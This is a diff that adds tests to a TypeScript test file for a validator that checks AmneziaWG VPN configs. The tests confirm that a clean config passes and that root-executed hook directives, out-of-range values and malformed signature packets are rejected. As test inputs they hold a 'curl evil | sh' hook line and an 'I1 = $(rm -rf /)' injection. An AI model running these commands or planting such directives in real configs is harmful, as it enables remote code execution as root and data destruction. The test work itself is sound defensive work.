@@ -15,6 +15,7 @@ import {
   withV2RayDoH,
   isSafeNodeApiUrl,
   assertSafeHysteria2Config,
+  assertSafeAmneziaWgConfig,
 } from './config-guard.ts'
 
 // A representative clean WireGuard config built from a node handshake.
@@ -400,4 +401,59 @@ test('assertSafeHysteria2Config rejects traffic-redirecting keys and bad server'
   assert.throws(() => assertSafeHysteria2Config({ ...CLEAN_HY2, outbounds: [{}] }), /outbounds.*not allowed/)
   assert.throws(() => assertSafeHysteria2Config({ ...CLEAN_HY2, acl: { inline: [] } }), /acl.*not allowed/)
   assert.throws(() => assertSafeHysteria2Config({ ...CLEAN_HY2, server: 'no-port' }), /host:port/)
+})
+
+// --- AmneziaWG config guard ---
+
+// A representative clean AmneziaWG config as amneziawg-config.ts builds it.
+const CLEAN_AWG = `[Interface]
+Address = 10.8.0.5/32,fd00::5/128
+PrivateKey = cHJpdmF0ZSBrZXkgcHJpdmF0ZSBrZXkgcHJpdmF0ZSE=
+DNS = 10.8.0.1,1.0.0.1,1.1.1.1
+Jc = 4
+Jmin = 128
+Jmax = 800
+S1 = 15
+S2 = 40
+S3 = 20
+S4 = 10
+H1 = 1234567891
+H2 = 987654321
+H3 = 246813579
+H4 = 1357924680
+I1 = <b 0xf6ab3267fd><r 16><t>
+
+[Peer]
+PublicKey = aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Qga2V5IQ==
+AllowedIPs = 0.0.0.0/0,::/0
+Endpoint = 203.0.113.10:51820
+PersistentKeepalive = 15
+`
+
+test('assertSafeAmneziaWgConfig accepts a builder-produced config', () => {
+  assert.doesNotThrow(() => assertSafeAmneziaWgConfig(CLEAN_AWG))
+})
+
+// The same LPE vector as wg-quick: awg-quick executes these directives as root.
+for (const directive of ['PostUp', 'PreUp', 'PostDown', 'PreDown', 'Table', 'SaveConfig']) {
+  test(`assertSafeAmneziaWgConfig rejects ${directive}`, () => {
+    const evil = CLEAN_AWG.replace('[Peer]', `${directive} = /bin/sh -c "curl evil | sh"\n[Peer]`)
+    assert.throws(() => assertSafeAmneziaWgConfig(evil), /not allowed/)
+  })
+}
+
+test('assertSafeAmneziaWgConfig rejects out-of-range obfuscation values', () => {
+  assert.throws(() => assertSafeAmneziaWgConfig(CLEAN_AWG.replace('H1 = 1234567891', 'H1 = 99999999999')), /uint32/)
+  assert.throws(() => assertSafeAmneziaWgConfig(CLEAN_AWG.replace('S1 = 15', 'S1 = 70000')), /uint16/)
+  assert.throws(() => assertSafeAmneziaWgConfig(CLEAN_AWG.replace('Jc = 4', 'Jc = notanumber')), /uint16/)
+})
+
+test('assertSafeAmneziaWgConfig rejects signature packets outside the tag grammar', () => {
+  assert.throws(() => assertSafeAmneziaWgConfig(CLEAN_AWG.replace(/I1 = .*/, 'I1 = $(rm -rf /)')), /signature packet/)
+  assert.throws(() => assertSafeAmneziaWgConfig(CLEAN_AWG.replace(/I1 = .*/, 'I1 = <x 12>')), /signature packet/)
+})
+
+test('assertSafeWireguardConfig still rejects AmneziaWG keys (allow-lists stay separate)', () => {
+  const wgWithJc = CLEAN_WG.replace('MTU = 1420', 'Jc = 4')
+  assert.throws(() => assertSafeWireguardConfig(wgWithJc), /"jc".*not allowed/)
 })
